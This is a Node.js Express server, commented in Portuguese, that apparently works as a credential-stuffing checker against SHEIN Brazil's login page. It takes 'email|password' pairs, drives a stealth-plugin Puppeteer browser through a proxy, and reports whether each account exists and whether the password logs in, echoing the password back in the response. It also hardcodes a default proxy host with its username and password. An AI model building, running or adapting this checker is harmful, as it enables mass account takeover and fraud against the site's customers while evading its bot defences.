const express = require("express");
const puppeteerExtra = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
puppeteerExtra.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;

app.get("/api/login", async (req, res) => {
  let browser;
  try {
    const { lista, proxy_host, proxy_port, proxy_user, proxy_pass } = req.query;
    
    if (!lista || !lista.includes("|")) {
      return res.status(400).json({
        success: false,
        error: "Formato inválido! Use /api/login?lista=email|senha",
      });
    }

    const [email, senha] = lista.split("|");

    // Configuração padrão de proxy (fallback)
    let proxyHost = "104.253.13.28";
    let proxyPort = "5460";
    let proxyUser = "ynrpepkl";
    let proxyPass = "nbzps5ke6ruj";
    let useAuth = true;

    // Usar proxy personalizado se fornecido
    if (proxy_host && proxy_port) {
      proxyHost = proxy_host;
      proxyPort = proxy_port;
      
      // Verificar se tem autenticação
      if (proxy_user && proxy_pass) {
        proxyUser = proxy_user;
        proxyPass = proxy_pass;
        useAuth = true;
      } else {
        useAuth = false; // Proxy sem autenticação
      }
    }

    browser = await puppeteerExtra.launch({
      headless: true,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        `--proxy-server=${proxyHost}:${proxyPort}`,
      ],
    });

    const page = await browser.newPage();

    // Autenticação no proxy apenas se necessário
    if (useAuth) {
      await page.authenticate({
        username: proxyUser,
        password: proxyPass,
      });
    }

    await page.goto("https://br.shein.com/user/auth/login", {
      waitUntil: "networkidle2",
    });

    // Preenche email
    const emailSelector =
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div.page__login-newUI-continue > div.page__login_input-filed.page__login-newUI-input > div > div.input_filed-wrapper > div > div > input";
    await page.waitForSelector(emailSelector, { visible: true });
    await page.type(emailSelector, email, { delay: 100 });

    const continueSelector =
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div.page__login-newUI-continue > div.actions > div > div > button";
    await page.click(continueSelector);

    await new Promise((resolve) => setTimeout(resolve, 2000));

    // Verifica se pediu criar conta
    const seletor =
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div:nth-child(2) > div > div.sui-dialog__ctn.sui-animation__dialog_W480 > div > div.sui-dialog__body > div.page__login-newUI-emailPannel > h2 > p";

    const elemento = await page.$(seletor);
    if (elemento) {
      const texto = await page.evaluate((el) => el.textContent, elemento);
      if (texto.trim() === "Crie sua SHEIN conta.") {
        await browser.close();
        return res.json({
          success: false,
          status: "Conta não existe",
          email,
          proxy: `${proxyHost}:${proxyPort}${useAuth ? ` (auth: ${proxyUser})` : ' (sem auth)'}`
        });
      }
    }

    // Senha
    const passwordSelector =
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div:nth-child(2) > div > div.sui-dialog__ctn.sui-animation__dialog_W480 > div > div.sui-dialog__body > div.page__login-newUI-emailPannel > div.main-content > div:nth-child(2) > div > div > input";
    await page.waitForSelector(passwordSelector, { visible: true });
    await page.type(passwordSelector, senha, { delay: 10 });

    // Botão login
    const loginButtonSelector =
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div:nth-child(2) > div > div.sui-dialog__ctn.sui-animation__dialog_W480 > div > div.sui-dialog__body > div.page__login-newUI-emailPannel > div.main-content > div.actions > div > button > span";
    await page.click(loginButtonSelector);

    await new Promise((resolve) => setTimeout(resolve, 2000));

    const elementoErro = await page.$(
      "body > div.c-outermost-ctn.j-outermost-ctn > div.container-fluid-1200.j-login-container.she-v-cloak-none > div > div > div > div.page__login-top-style > div:nth-child(2) > div > div.sui-dialog__ctn.sui-animation__dialog_W480 > div > div.sui-dialog__body > div.page__login-newUI-emailPannel > div.main-content > div.page__login_input-filed.page__login-newUI-input.error > p"
    );

    await browser.close();

    if (elementoErro) {
      return res.json({
        success: false,
        status: "Login inválido",
        email,
        senha,
        proxy: `${proxyHost}:${proxyPort}${useAuth ? ` (auth: ${proxyUser})` : ' (sem auth)'}`
      });
    } else {
      return res.json({
        success: true,
        status: "Login efetuado",
        email,
        senha,
        proxy: `${proxyHost}:${proxyPort}${useAuth ? ` (auth: ${proxyUser})` : ' (sem auth)'}`
      });
    }
  } catch (error) {
    if (browser) await browser.close();
    return res.status(500).json({
      success: false,
      error: "Erro interno no servidor",
      details: error.message,
    });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
